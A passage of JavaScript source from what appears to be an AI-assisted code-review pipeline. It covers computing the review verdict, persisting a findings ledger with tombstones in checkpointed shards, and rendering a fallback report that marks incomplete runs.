      { label: 'pr-comments', phase: 'Synthesize', effort: 'low', schema: PR_COMMENTS_SCHEMA },
    )
    if (posted == null) log(`⚠️ PR comments: the poster agent returned nothing — ${defects.length} Confirmed finding(s) may or may not have been posted; check the PR`)
    else if (Number(posted.posted) > 0) log(`PR comments: posted ${Number(posted.posted)} of ${defects.length} Confirmed finding(s) — ${posted.reason || 'no detail'}`)
    else log(`⚠️ PR comments: nothing was posted (${defects.length} Confirmed finding(s) requested) — ${posted.reason || 'no reason given'}`)
  }
}
await postPrComments()

const allReviewFindings = confirmed.concat(suspected, unverified)
// The verification denominator: what verification ACTUALLY judged. `unverified` is deliberately
// absent — including it once made refuteRate incomparable across runs (on one measured run 118 of
// 215 findings were Low/Info, so the denominator was more than double the 89 verdicts really cast).
const totalVerified = confirmed.length + suspected.length + dropped + priorRejected.filter(f => f.priorTier !== 'unverified').length - priorRejectedLive
/** The verdict the record carries: the re-review tracks or the confirmed set, escalated by strict maintainability. */
function decideRecordVerdict() {
  let decided = isRereview
    ? rereviewVerdict({ stillOpen: adjudicated.stillOpen, regressed: adjudicated.regressed, neu: confirmed })
    : finalVerdict(confirmed)
  // Strict-mode maintainability escalation applies to a re-review too (finalVerdict already covers the
  // first-pass path): a Confirmed Medium+ maintainability finding among the live re-review set blocks.
  if (isRereview && strict && [...adjudicated.stillOpen, ...adjudicated.regressed, ...confirmed]
    .some(f => isMaintainability(f) && (f.severity === 'Critical' || f.severity === 'High' || f.severity === 'Medium'))) {
    decided = 'Block'
  }
  return decided
}
const recordVerdict = decideRecordVerdict()
// THE PREMISE OF THE SAVING, CHECKED AGAINST THE VERDICT THAT ACTUALLY CAME OUT. Skipping a Medium
// is legitimate only while "the verdict is already Block" stays true, and that is a claim about a
// moment, not an invariant: the floor is raised during Verify, and a confirmed finding can still
// leave the verdict afterwards — on a re-review `absorbAcross` folds it into a carried (dismissed)
// prior, and carried priors are deliberately excluded from `rereviewVerdict`. The Critical the
// saving rested on then vanishes from the verdict while the unverified Mediums remain unverified,
// and one of them could have been the difference between Approve and Warning.
// So the premise is RE-READ here rather than trusted: if the run did not end at Block, the skip was
// a genuine coverage hole after all, and it converts into exactly what a coverage hole is — a
// `notRun` entry, which a re-run can and should fix. This is the one case where the saving and the
// failure are the same event, told apart only by an outcome that is not known when the skip is made.
const floorPremiseHeld = !savedByFloor.length || recordVerdict === 'Block'
function reportRevokedPremise() {
  if (!floorPremiseHeld) {
    notRun.push(...savedByFloor.map(n => `${n} — AND THE PREMISE DID NOT HOLD: the run ended at ${recordVerdict}, not Block, so the saving rested on a confirmed finding that did not reach the verdict; re-run to check them`))
    log(`⚠️ ${savedByFloor.length} verification(s) were skipped because the verdict was already Block, but the run ended at ${recordVerdict} — the skipped findings are reported as a coverage hole, not as a saving`)
  }
}
reportRevokedPremise()
// A usage limit reached after the lens phase (verification, synthesis) still leads notRun before the record.
function noteLateLimit() {
  if (limitStop.seen() && !notRun.includes(limitStop.note())) notRun.unshift(limitStop.note())
}
noteLateLimit()
// Persist the ledger so round N+1 can find round N. On a re-review it grows by FOUR paths, not the
// three that are obvious: (1) the new delta findings; (2) still-open/regressed priors, as 'open';
// (3) dismissed priors still carried, with their disposition; and (4) — easy to miss because it
// enters through (1) — a NEW finding whose only carrier RETIRED this round. partitionAbsorbed keeps
// such a finding rather than absorbing it into a host that will not be persisted, so on a full
// re-scan a dismissal can retire and its own re-discovery re-enter the very same ledger as 'open',
// stripped of the author's disposition. That is deliberate and its cost is argued at the retirement
// comment above (losing a label beats losing a defect) — but it is a path, and an enumeration that
// omits it reads as a guarantee it does not make.
// `resolved` and `retired` priors do not re-enter as LIVE rows — they have been answered and cost no
// further adjudication — but neither do they vanish: each leaves a `disposition:'closed'` tombstone
// (below) so a later round can tell its return from a novelty. Without the carry-forward the ledger
// would otherwise hold only this round's delta, and a finding open across 3+ rounds — or a dismissed
// one — would silently vanish after one hop.

// A tombstone for a resolved/retired prior: the same ledger shape, `disposition:'closed'`, but its
// `why` is a fixed ORIGIN+round marker rather than the original rationale — a tombstone's only job is
// an equality test (the recidivism check on load) plus telling a fixed defect that REGRESSED
// (`resolved`) from a dismissed one that was RE-RAISED (`dismissed`), so it carries the origin and
// the round it closed in, and no prose. The origin lives in `why` (not a new field) so it rides the
// existing ledger shape and the round-marker regex reads both forms unchanged.
// `fp` is RECOMPUTED under THIS round's basis, overriding the `f.fp || fingerprint(f)` toLedgerEntry
// would otherwise carry: a prior LIVE finding loaded from a ledger written under an earlier fingerprint
// basis still carries its stored old-basis `fp`, and if a tombstone minted from it kept that stale
// hash, a later same-basis round would key the recidivism check on the old basis (`t.fp`) while
// looking the returning defect up under the current one (`fingerprint(f)`) — the two never match and
// the regression is missed in silence, the exact class the fingerprint-basis guard removes, only shifted a round
// on. Minting every tombstone under the current basis closes it for BOTH paths (resolved and dismissed);
// an incomparable CARRIED tombstone is dropped at assembly below, never re-minted here.
const toTombstone = (/** @type {Finding} */ f, origin = 'resolved') => {
  // A tombstone's `why` is a fixed ORIGIN+round marker, not a shortened rationale, so it owes no
  // `whyRef` back-pointer — drop the one a carried source finding may bring in, keeping the row bare.
  const { whyRef: _whyRef, ...entry } = toLedgerEntry(f, 'closed', f['tier'])
  return { ...entry, fp: fingerprint(f), why: `${origin} in round ${thisRound}` }
}
// The tombstone set is bounded against the border that actually governs the persisted
// ledger: the single-call copy of the FINAL record refuses on the WHOLE ledger (~170 entries), live
// rows AND tombstones together — NOT on tombstones alone. So count the live rows this ledger will carry
// and hand pruneTombstones a `tombstoneBudget` that leaves room for them under that border. Without it
// the set grew monotonically — new tombstones plus every earlier one carried verbatim, a fresh same-fp
// row per recidivist cycle — and, sized against the far looser shard budget, could cross the copy-
// refusal border on tombstones-plus-live and invert the memory into a per-round full rescan. It is
// also DEDUPED by binding (newest per fingerprint and tool identity); the read side above already tolerates a tombstone it no
// longer remembers (it treats the finding as novel), so the cap evicting the oldest rounds is safe.
const liveLedgerCount = confirmed.length + suspected.length +
  unverified.filter(f => !f.ledgerDupOfUnverifiedPrior).length +
  adjudicated.stillOpen.length + adjudicated.regressed.length + adjudicated.carried.length + priorRejected.length
const tombstones = assembleTombstones()
function assembleTombstones() {
  return pruneTombstones([
    ...adjudicated.resolved.map(f => toTombstone(f, 'resolved')),
    ...adjudicated.retired.map(f => toTombstone(f, 'dismissed')),
    // Carried tombstones from an incomparable fingerprint basis are dropped, not carried forward under a
    // stale basis: a clean baseline after a basis change (or a reported loss when the basis verdict did
    // not arrive). This round's own tombstones are minted under the current basis (toTombstone recomputes
    // `fp`, so even a prior loaded under an old basis gets a current-basis hash) and kept regardless.
    ...(priorFpComparable ? priorTombstones : []),
  ], { max: tombstoneBudget(liveLedgerCount), identity: toolIdentity })
}
const reviewLedger = assembleLedger()
function assembleLedger() {
  return isRereview
    ? [
      ...confirmed.map(f => toLedgerEntry(f, 'open', 'confirmed')),
      ...suspected.map(f => toLedgerEntry(f, 'open', 'suspected')),
      // An unverified finding whose carrier is ITSELF an unverified prior writes no second row: see
      // `ledgerDupOfUnverifiedPrior` in lib/review-adjudicate.mjs for why that host and no other.
      ...unverified.filter(f => !f.ledgerDupOfUnverifiedPrior).map(f => toLedgerEntry(f, 'open', 'unverified')),
      ...adjudicated.stillOpen.map(f => toLedgerEntry(f, 'open')),
      ...adjudicated.regressed.map(f => toLedgerEntry(f, 'open')),
      // `adjudicated.resolved`/`adjudicated.retired` no longer leave the ledger silently: each becomes a
      // lightweight TOMBSTONE (`disposition:'closed'`) so a later round can tell the defect's RETURN
      // from a genuine novelty. It is not a live finding — the carve-out on load keeps it out of the
      // adjudicator — and it costs one bare row, not a re-adjudicated one. The set (this round's plus
      // the earlier ones carried forward) is deduped and capped above; each row keeps its own origin+
      // round marker, which is the round the REGRESSION / re-raised note reports.
      ...tombstones,
      ...adjudicated.carried.map(f => toLedgerEntry(f, f['disposition'])),
      ...priorRejected.map(f => toLedgerEntry(f, priorDisposition(f), f.priorTier)),
    ]
    : allReviewFindings.map(f => toLedgerEntry(f, 'open', f.tier || 'suspected')).concat(priorRejected.map(f => toLedgerEntry(f, priorDisposition(f), f.priorTier)))
}
// THE LEDGER IS PERSISTED BEFORE THE RECORD IS ATTEMPTED, in bounded shards, one small checkpoint
// per shard (lib/ledger-shards.mjs carries the measurement and the reasoning). The final record is
// written once, at the end, through a model copying the whole thing in one tool call — the step that
// lost three consecutive runs, the last of them a logger that REFUSED a ~170-entry ledger outright
// rather than risk truncating it. Checkpoints are the step that survived all three. So the ledger
// goes down that path first: if `logRun` below is lost, the next round still reads this round's
// findings out of `.partial` instead of starting over.
//
// Written HERE and not earlier because this is the first moment the ledger exists — it is the
// carry-forward, so it needs the adjudication of the prior round that only just finished.
//
// And once every shard has landed in the run's own directory, the record leaves the ledger to them:
// the one copy that kept being interrupted no longer carries the largest array, and finalize rebuilds
// it from the shards (realm @nick/craft, node #245). A directory that may have been adopted — a
// rejoin was armed — is not the run's own, so the record then carries the whole ledger as before.
async function persistLedgerShards() {
  const shards = shardLedger(reviewLedger)
  let landed = true
  for (const shard of shards) {
    landed = (await checkpoint(`${LEDGER_SHARD_PHASE}-${String(shard.ledgerShard.index).padStart(2, '0')}`, { branch, head, ...shard }, 'Synthesize')) && landed
  }
  return ledgerRecordFields(reviewLedger, shards, landed && !rejoinArmed)
}
const ledgerFields = await persistLedgerShards()
await logRun(reviewRecord({
  verdict: honestVerdict(recordVerdict + verdictSuffix({ notRun, coverageNotes, floorPremiseHeld }), notRun),
  savedByFloor,
  // Recorded as its own field, not inferred from the two lists: "the saving was legitimate" and
  // "the saving turned into a hole" are the question any later count of this economy has to ask
  // first, and deriving it from string shapes would break the moment a string is reworded.
  savedByFloorPremiseHeld: floorPremiseHeld,
  round: thisRound,
  findings: summarizeFindings(allReviewFindings),
  ...ledgerFields,
  dimensions: results.flatMap(r => r['plan'].lenses.map((/** @type {string} */ l) => {
    const s = summarizeFindings(r['confirmed'].filter((/** @type {Finding} */ f) => (f['source'] || '') === l))
    const confirmedCount = r['confirmed'].filter((/** @type {Finding} */ f) => (f['source'] || '') === l).length
    const suspectedCount = r['suspected'].filter((/** @type {Finding} */ f) => (f['source'] || '') === l).length
    const unverifiedCount = (r['unverified'] || []).filter((/** @type {Finding} */ f) => (f['source'] || '') === l).length
    const refutedCount = (r['refuted'] || []).filter((/** @type {Finding} */ f) => (f['source'] || '') === l).length
    // `ran` distinguishes "executed and found nothing" from "never returned". Both otherwise render
    // as a 0-finding row, and the yield analysis would read a broken lens as a redundant one.
    // Absent `ranLenses` (a record written before this landed) → assume it ran, the old behaviour.
    const ran = r.ranLenses ? r.ranLenses.includes(l) : true
    return { dimension: `${r.profile.id}:${l}`, ran, verdict: '', findingCount: s.total, bySeverity: s.bySeverity, confirmedCount, suspectedCount, refutedCount, unverifiedCount }
  })),
  verification: { candidates: totalVerified, confirmed: confirmed.length, refuteRate: refuteRate(dropped, totalVerified), unverified: unverified.length, thinned },
  // The sorting before publication, with `comment` only (realm @nick/craft, node #270).
  sorting: sortingRecord(),
  // The findings going against memory, sorted to the defects before any doubt sign (realm @nick/craft, node #282).
  memoryContradictions: contradictionsRecord(),
  notRun,
}))

// If the synthesis agent died even after the retry, don't lose the whole run — assemble a
// mechanical report from the verified findings (unmerged, but complete).
function fallbackReport() {
  // Why there is no synthesized report: a death and a live answer that was not report text read differently.
  const cause = fallbackCause()
  // On a re-review the verdict must come from recordVerdict (still-open+regressed+new), NOT
  // finalVerdict(confirmed) — confirmed holds only the delta, so finalVerdict would print a false
  // Approve and hide live still-open/regressed priors. Render those tracks too.
  const emoji = { Block: '⛔ Block', Warning: '⚠️ Warning', Approve: '✅ Approve' }[isRereview ? recordVerdict : finalVerdict(confirmed)]
  const verdictMark = fallbackVerdictMark(emoji)
  // The catalog ruleId and a gate tool's own rule beside it (realm @nick/craft, node #236).
  const ruleTag = (/** @type {Finding} */ f) => { const r = [f['ruleId'], f['toolRule'] ? `tool: ${f['toolRule']}` : ''].filter(Boolean).join(' · '); return r ? ` · [${r}]` : '' }
  const fmt = (/** @type {Finding} */ f) => `- ${f['severity']} · \`${f['file'] || '?'}:${f['line'] || 0}\`${ruleTag(f)} · ${f['title']} · ${f['why']} · Fix: ${f['fix']}${f['whereChecked'] ? ` · Premise checked at: ${f['whereChecked']}` : ''}`
  const bySev = (/** @type {Finding[]} */ a) => a.slice().sort((/** @type {Finding} */ x, /** @type {Finding} */ y) => (SEV_RANK[x['severity'] ?? ''] ?? 9) - (SEV_RANK[y['severity'] ?? ''] ?? 9))
  return [
    `## Verdict`,
    // `notRun` LIVE, not the `incompleteNotes` snapshot taken before the verdict existed: the
    // revoked-premise path pushes into `notRun` afterwards, and a fallback rendered from the stale
    // snapshot would print a clean verdict over findings the same run has just declared unchecked.
    `${verdictMark} \u2014 ${cause}; mechanical fallback report (findings listed unmerged).${fallbackIncompleteClause()}`,
    ``, `## Gate`, mergedProvenance, carriedSection(),
    ...fallbackRereviewTracks(bySev, fmt),
    ``, `## ${isRereview ? '🆕 New' : 'Confirmed'}`, ...(confirmed.length ? bySev(confirmed).map(fmt) : ['- none']),
    ...(suspected.length ? [``, `## Suspected (needs confirmation)`, ...bySev(suspected).map(fmt)] : []),
    ...(unverified.length ? [``, `## Unverified (not checked)`, UNVERIFIED_PREAMBLE, ...bySev(unverified).map(fmt)] : []),
    ...(uncoveredFiles.length ? [``, `## Not reviewed (no language profile)`, ...uncoveredFiles.map((/** @type {string} */ f) => `- ${f}`)] : []),
  ].join('\n')
}

/** Why there is no synthesized report: the usage-limit stop first, then the synthesis agent's own failure. */
function fallbackCause() {
  if (limitStop.seen()) return limitStop.note()
  return synthesisUnusable ? 'synthesis agent returned no usable report' : 'synthesis agent died twice'
}

/** Never Approve over what did not run (realm @nick/craft, node #299): the same rule as the record. @param {string | undefined} emoji */
function fallbackVerdictMark(emoji) {
  return honestVerdict(isRereview ? recordVerdict : finalVerdict(confirmed), notRun) === 'INCOMPLETE' ? '\u26a0\ufe0f INCOMPLETE' : emoji
}

/** The fallback verdict line's incompleteness clause, read from the live `notRun`. */
function fallbackIncompleteClause() {
  return [...notRun, ...coverageNotes].length ? ` · ⚠️ ${notRun.length ? 'INCOMPLETE — part of this review did not run' : 'PARTIAL COVERAGE — a coverage hole a re-run will not fix'}: ${[...notRun, ...coverageNotes].join('; ')}.` : ''
}

/** A re-review's still-open and regressed tracks in the fallback report. @param {(a: Finding[]) => Finding[]} bySev @param {(f: Finding) => string} fmt @returns {string[]} */
function fallbackRereviewTracks(bySev, fmt) {
  return [
    ...(isRereview && adjudicated.stillOpen.length ? [``, `## 🔴 Still open`, ...bySev(adjudicated.stillOpen).map(fmt)] : []),
    ...(isRereview && adjudicated.regressed.length ? [``, `## ⚠️ Regressed`, ...bySev(adjudicated.regressed).map(fmt)] : []),
  ]
}

// APPENDED AFTER SYNTHESIS, because the synthesis prompt is composed before the verdict exists and
// therefore cannot carry this. The model wrote its report believing the run was a Block; if it was
// not, the reader is told here, in the report itself, rather than only on the run record.
// THE VERDICT LINE ITSELF, not only a section under it. The synthesis prompt was composed before
// the verdict existed, so the model wrote its `## Verdict` line believing the run was a Block — and
// a reader who has read a green verdict line has been misled, whatever a section at the bottom of
// the document says afterwards. The run record already says INCOMPLETE here, so without this the
// record and the report disagree, and rust-audit's dimension roll-up reads the verdict STRING: a
// clean line there carries the wrong-green up into the audit.
// Amends the first non-empty line under `## Verdict`, and only if it does not already say so.
/** @param {string} text */
function markVerdictIncomplete(text) {
  if (floorPremiseHeld) return text
  const lines = String(text).split('\n')
  const headingAt = lines.findIndex(l => /^#+\s*Verdict\b/i.test(l.trim()))
  if (headingAt < 0) return text
  const at = lines.findIndex((l, i) => i > headingAt && l.trim())
  if (at < 0 || /INCOMPLETE/.test(/** @type {string} */ (lines[at]))) return text
  lines[at] = `${lines[at]} · ⚠️ INCOMPLETE — ${savedByFloor.length} verification(s) were skipped because the verdict stood at Block, and the run did not end at Block; those findings are unverified for a reason that did not apply.`
  return lines.join('\n')
}

function floorPremiseSection() {
  if (floorPremiseHeld) return ''
  return `\n\n## ⚠️ INCOMPLETE — a verification saving whose premise did not hold\n`
    + `${savedByFloor.length} batch verification(s) were deliberately not dispatched because the verdict stood at Block when their turn came, and no judgement on a Medium can move a Block. The run ended at ${recordVerdict}. The saving therefore rested on a confirmed finding that did not reach the final verdict, and those findings are UNVERIFIED for no good reason — treat this section as a coverage hole and re-run. They are listed under Unverified above.\n`
    + savedByFloor.map(n => `- ${n}`).join('\n')
}

// Appended, not asked of the synthesis model: a finding set aside by a prior decision must reach the
// reader with that decision, whatever the model chose to render.
// The verbatim titles of the verdict's tool findings that name no rule: the engine's, never the model's (realm @nick/craft, node #236).
/** Every finding the report prints and the author can rule on: Confirmed (New on a re-review), Suspected, Unverified — most deadnix/statix seeds are Low and land Unverified — and on a re-review the still-open and regressed priors. A regressed prior prints under Regressed with the prior round's title; listing that title beside a fresh Low seed's at the same site lets the equal-title rule pick (realm @nick/craft, node #236); a Medium or higher fresh seed there is folded into the prior instead, unless the tool tells the two apart (#239). @returns {Finding[]} */
function verdictFindings() {
  const tiers = [...confirmed, ...suspected, ...unverified]
  return isRereview ? [...adjudicated.stillOpen, ...adjudicated.regressed, ...tiers] : tiers
}
return out(markVerdictIncomplete(honestVerdictLine(report || fallbackReport(), notRun)) + floorPremiseSection() + priorRejectedSection([...priorRejected, ...carriedDeferred()]) + projectRuleSection(priorRejected, ruleNotices) + contradictionSection(verdictFindings()) + doubtfulReport() + toolTitlesSection(verdictFindings()) + scopeSection())
}
